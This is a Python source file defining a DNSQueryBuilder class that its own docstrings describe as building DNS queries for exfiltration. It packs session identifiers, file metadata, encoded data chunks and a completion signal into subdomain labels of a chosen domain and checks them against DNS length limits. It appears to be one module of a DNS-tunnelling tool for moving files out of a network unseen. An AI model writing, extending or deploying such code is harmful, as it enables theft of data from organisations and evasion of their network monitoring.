#!/usr/bin/env python3
"""
DNS query construction
"""

class DNSQueryBuilder:
    """Build DNS queries for exfiltration"""
    
    def __init__(self, domain):
        """
        Initialize query builder
        
        Args:
            domain: Exfiltration domain
        """
        self.domain = domain.rstrip('.')
    
    def build_chunk_query(self, chunk_index, chunk_data):
        """
        Build DNS query for chunk
        
        Args:
            chunk_index: Index of chunk
            chunk_data: Chunk data (already encoded)
            
        Returns:
            DNS query name
        """
        # Format: chunk0001-data.domain.com
        query_name = f"chunk{chunk_index:04d}-{chunk_data}.{self.domain}"
        return query_name
    
    def build_session_query(self, session_id):
        """
        Build session initialization query
        
        Args:
            session_id: Unique session identifier
            
        Returns:
            DNS query name
        """
        return f"session-{session_id}.{self.domain}"
    
    def build_metadata_query(self, session_id, total_chunks, file_size):
        """
        Build metadata query with exfiltration info
        
        Args:
            session_id: Session ID
            total_chunks: Total number of chunks
            file_size: Original file size
            
        Returns:
            DNS query name
        """
        metadata = f"{session_id}-{total_chunks}-{file_size}"
        return f"meta-{metadata}.{self.domain}"
    
    def build_completion_query(self, session_id):
        """
        Build completion signal query
        
        Args:
            session_id: Session ID
            
        Returns:
            DNS query name
        """
        return f"complete-{session_id}.{self.domain}"
    
    def validate_query_length(self, query):
        """
        Validate DNS query length
        
        Args:
            query: DNS query name
            
        Returns:
            True if valid, False otherwise
        """
        # DNS names limited to 253 characters
        # Each label limited to 63 characters
        if len(query) > 253:
            return False
        
        labels = query.split('.')
        for label in labels:
            if len(label) > 63:
                return False
        
        return True